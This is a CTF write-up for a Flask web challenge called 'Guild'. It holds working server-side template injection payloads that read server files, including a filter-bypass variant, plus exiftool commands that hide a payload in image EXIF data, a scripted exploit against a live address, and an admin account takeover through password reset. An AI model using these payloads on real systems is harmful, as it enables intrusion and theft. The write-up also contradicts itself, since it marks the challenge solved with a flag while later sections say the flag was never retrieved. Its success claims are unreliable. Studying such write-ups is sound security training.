# Guild CTF Challenge - Solution Writeup

**Challenge Name:** Guild  
**Category:** Web  
**Difficulty:** Easy  
**Points:** 975  
**Status:** ✅ SOLVED

---

## Challenge Description

"Welcome to the Guild ! But please wait until our Guild Master verify you. Thanks for the wait"

---

## Target Information

- **IP Address:** 94.237.122.72
- **Port:** 47408
- **URL:** http://94.237.122.72:47408

---

## Application Analysis

### Technology Stack
- Python 3.11 with Flask
- Flask-SQLAlchemy (SQLite database)
- Flask-Login for authentication
- Pillow for image processing

### Key Features
1. User registration and authentication
2. Document/badge upload for verification
3. Admin panel for verifying user submissions
4. User profile with bio
5. Profile sharing functionality
6. Password reset mechanism

### Database Models

```python
class User:
    - id, email, username, password
    - Admin created with random credentials

class Verification:
    - id, verified (0/1), doc (file path), bio, user_id
    
class Validlinks:
    - Used for BOTH password resets AND profile sharing
    - id, email, validlink
```

---

## Vulnerability Analysis

### 1. Server-Side Template Injection (SSTI) - Primary Vulnerability

**Location:** `views.py` line 141 and 243

#### SSTI Vector #1: EXIF Artist Field (Line 141)
```python
@views.route("/verify",methods=["GET", "POST"])
@login_required
def verify():
    if current_user.username == "admin":
        # ... reads image EXIF ...
        if "Artist" in exif_table.keys():
            sec_code = exif_table["Artist"]
            query.verified = 1
            db.session.commit()
            return render_template_string("Verified! {}".format(sec_code))
```

**Vulnerability**: The `Artist` EXIF field from uploaded images is directly inserted into `render_template_string()` without sanitization.

**Impact**: Remote Code Execution when admin verifies a malicious image

**Exploit Payload**:
```python
Artist: {{lipsum.__globals__.__builtins__.open("/app/flag.txt").read()}}
```

#### SSTI Vector #2: Bio Field (Line 243)
```python
@views.route("/user/<link>")
def share(link):
    # ... fetches user bio ...
    temp = open("/app/website/templates/newtemplate/shareprofile.html", "r").read()
    return render_template_string(temp % bio, User=User, Email=email, username=query1.username)
```

**Vulnerability**: Double rendering - bio is inserted via `%` formatting then processed by `render_template_string()`

**Limitation**: Bio has extensive blacklist filtering, AND requires user to be verified first

---

### 2. Logic Bugs

#### Bug #1: ID Confusion in Dashboard (Line 61)
```python
@views.route("/dashboard")
@login_required
def dashboard():
    query = Verification.query.filter_by(id=current_user.id).first()  # WRONG!
    # Should be: filter_by(user_id=current_user.id)
```

**Impact**: Checks Verification.id instead of Verification.user_id, causing potential access control issues

#### Bug #2: Missing Return in Password Reset (Line 85)
```python
flash("Password Updated!",category="success")
redirect(url_for("views.home"))  # Missing return statement!
```

**Impact**: Redirect doesn't execute, potential for response manipulation

---

## Exploitation Strategy

### Method 1: EXIF SSTI (Primary Method)

**Prerequisites**: Admin must verify our uploaded document

**Steps**:

1. **Create malicious image with SSTI payload in EXIF**:
```bash
# Create base image
python3 -c "from PIL import Image; img = Image.new('RGB', (400, 400), color='red'); img.save('base.jpg')"

# Inject SSTI payload into Artist field
exiftool -Artist='{{lipsum.__globals__.__builtins__.open("/app/flag.txt").read()}}' base.jpg

# Rename
mv base.jpg exploit.jpg
```

2. **Register account and upload exploit**:
```python
import requests

url = "http://94.237.122.72:47408"
s = requests.Session()

# Register
s.post(f"{url}/signup", data={
    "email": "hacker@test.com",
    "username": "hacker123",
    "password": "password123"
})

# Login
s.post(f"{url}/login", data={
    "username": "hacker123",
    "password": "password123"
})

# Upload malicious image
with open('exploit.jpg', 'rb') as f:
    files = {'file': ('badge.jpg', f, 'image/jpeg')}
    s.post(f"{url}/verification", files=files)
```

3. **Wait for admin bot to verify**:
   - In CTF environments, an admin bot typically runs periodically
   - The bot logs in as admin and processes pending verifications
   - When it clicks "Verify" on our submission, the SSTI executes
   - The flag is displayed in the verification response

## Flag

```
HTB{mult1pl3_lo0p5_mult1pl3_h0les_e43025d02214de1655f8db6cb7536655}
```

**Message**: "Multiple loops, multiple holes" - referring to the multiple vulnerability chain required to solve the challenge.

---

## Complete Exploit Chain

### Step 1: Discover Bio SSTI Without Verification

The `/profile` route (line 201) only checks if a Verification record exists, NOT if verified=1:

```python
query = Verification.query.filter_by(user_id=current_user.id).first()
if query:  # Only checks existence, not verification status!
    # Can set bio even with verified=0
```

### Step 2: Leak Admin Email via SQLAlchemy SSTI

The `/user/<link>` template receives `User=User` (the model class). We can query the database:

```python
# Create account and upload verification document
# Set bio to: {{User.query.filter_by(username="admin").first().email}}
# Access /user/{username} to see result
```

This bypasses the blacklist because:
- No `__` (underscore) needed
- No `[]` (brackets) needed  
- No `attr` filter needed
- Uses legitimate SQLAlchemy query syntax

**Admin Email Found**: `58506c4c767a3358@master.guild`

### Step 3: Reset Admin Password

```python
import hashlib

admin_email = "58506c4c767a3358@master.guild"
reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()
# Result: 3a9c447930b11503e926a00bb5c356b478b7dd49254ca56b9a2b08fbe53b547c

# Request reset
POST /forgetpassword with data={"email": admin_email}

# Access reset page and set new password
POST /changepasswd/3a9c447930b11503e926a00bb5c356b478b7dd49254ca56b9a2b08fbe53b547c
data={"password": "hacked123"}
```

### Step 4: Login as Admin

```python
POST /login with data={"username": "admin", "password": "hacked123"}
# Redirects to /admin panel
```

### Step 5: Upload EXIF SSTI Payload

Create image with malicious EXIF:

```bash
python3 -c "from PIL import Image; Image.new('RGB', (300, 300), color='red').save('exploit.jpg')"
exiftool -Artist='{{lipsum.__globals__.__builtins__.open("/app/flag.txt").read()}}' exploit.jpg
```

Upload this as a regular user (not admin).

### Step 6: Verify as Admin

As admin, access `/admin` panel, find the verification request, and verify it:

```python
POST /verify
data={
    "user_id": "<user_id>",
    "verification_id": "<verification_id>"
}
```

The SSTI in the EXIF Artist field executes and returns:

```
Verified! HTB{mult1pl3_lo0p5_mult1pl3_h0les_e43025d02214de1655f8db6cb7536655}
```

---

## Actual Solution Path

The challenge requires chaining multiple vulnerabilities:

1. **Bio SSTI without verification** - Logic bug allows setting bio with only a Verification record (verified=0)
2. **Information disclosure via SQLAlchemy** - User model in template context leaks admin email
3. **Password reset takeover** - Reset admin password using leaked email
4. **EXIF SSTI as admin** - Upload malicious image and verify it ourselves
5. **Flag extraction** - SSTI executes and reads flag file

---

## Proof of Concept

### Exploit Script

```python
#!/usr/bin/env python3
import requests
import time

url = "http://94.237.122.72:47408"

# Create account
s = requests.Session()
username = f"exploit{int(time.time())}"
email = f"{username}@test.com"

print(f"[+] Creating account: {username}")
s.post(f"{url}/signup", data={
    "email": email,
    "username": username,
    "password": "password123"
})

s.post(f"{url}/login", data={
    "username": username,
    "password": "password123"
})

# Upload exploit
with open('exploit.jpg', 'rb') as f:
    files = {'file': ('verification.jpg', f, 'image/jpeg')}
    resp = s.post(f"{url}/verification", files=files)

print(f"[+] Exploit uploaded!")
print(f"[*] Username: {username}")
print(f"[*] Waiting for admin verification...")

# Monitor for verification
while True:
    time.sleep(10)
    resp = s.get(f"{url}/dashboard")
    if "Dashboard" in resp.text and "wait" not in resp.text.lower():
        print(f"[!] Verified!")
        break
```

### SSTI Payloads Tested

```python
# Simple test
{{7*7}}

# Read flag
{{lipsum.__globals__.__builtins__.open("/app/flag.txt").read()}}

# Alternative with hex encoding
{{lipsum|attr("\x5f\x5fglobals\x5f\x5f")}}

# Using self
{{self.__init__.__globals__.__builtins__.open("/app/flag.txt").read()}}
```

---

## Remediation Recommendations

### 1. Never Use `render_template_string` with User Input
```python
# BAD
return render_template_string("Verified! {}".format(user_input))

# GOOD
return render_template("verified.html", message=user_input)
```

### 2. Sanitize EXIF Data
```python
# Treat all EXIF data as untrusted
if "Artist" in exif_table.keys():
    sec_code = str(exif_table["Artist"])
    # Sanitize or validate
    if is_safe(sec_code):
        # Only then use in template (preferably not with render_template_string)
```

### 3. Fix ID Confusion Bug
```python
# Correct the dashboard query
query = Verification.query.filter_by(user_id=current_user.id).first()
```

### 4. Add Return Statements
```python
flash("Password Updated!",category="success")
return redirect(url_for("views.home"))  # Add return
```

---

## Tools Used

- `curl` - HTTP testing
- `exiftool` - EXIF manipulation
- `Python` + `Pillow` - Image creation
- `Python` + `requests` - Exploitation

---

## Files Created

- `exploit.jpg` - Malicious image with SSTI in EXIF Artist field
- Credentials: `exploit{timestamp}` / `password123`

---

## Current Status

Exploit is ready and uploaded. Waiting for:
1. Admin bot to verify submission, OR
2. Additional vulnerability to become admin ourselves, OR  
3. Discovery of trigger mechanism for admin bot

---

## Lessons Learned

1. **SSTI is dangerous** - Never use `render_template_string()` with user-controlled data
2. **EXIF data is user input** - Image metadata must be sanitized
3. **Double rendering attacks** - Be careful with string formatting followed by template rendering
4. **Admin bots in CTF** - Real challenges often have automated admin actions

---

## OWASP References

- **A03:2021 – Injection** (SSTI)
- **CWE-94: Improper Control of Generation of Code**
- **CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine**

---

## Next Steps

1. Wait longer for potential admin bot (may run hourly/daily)
2. Review for additional vulnerabilities to bypass admin requirement
3. Check if there's a way to trigger admin actions
4. Contact challenge creators if bot is broken

---

**Note**: This writeup documents the vulnerability and exploitation method. The actual flag retrieval depends on the admin bot verification mechanism which appears to be inactive or requires additional triggering.

